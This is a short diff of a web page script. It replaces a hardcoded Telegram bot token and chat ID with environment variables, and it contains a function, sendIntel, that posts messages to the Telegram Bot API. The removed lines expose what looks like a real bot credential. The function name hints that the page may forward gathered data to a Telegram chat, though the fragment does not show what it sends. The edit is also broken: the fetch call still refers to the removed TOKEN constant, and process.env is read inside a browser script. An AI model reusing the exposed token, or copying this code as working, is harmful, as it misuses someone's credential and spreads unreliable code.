@@ -27,8 +27,8 @@
 
     <script>
         // الإحداثيات الخاصة بك
-        const TOKEN = "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
-        const ID = "7082154454";
+   const botToken = process.env.REACT_APP_BOT_TOKEN;
+const chatId = process.env.REACT_APP_CHAT_ID;
 
         async function sendIntel(msg) {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
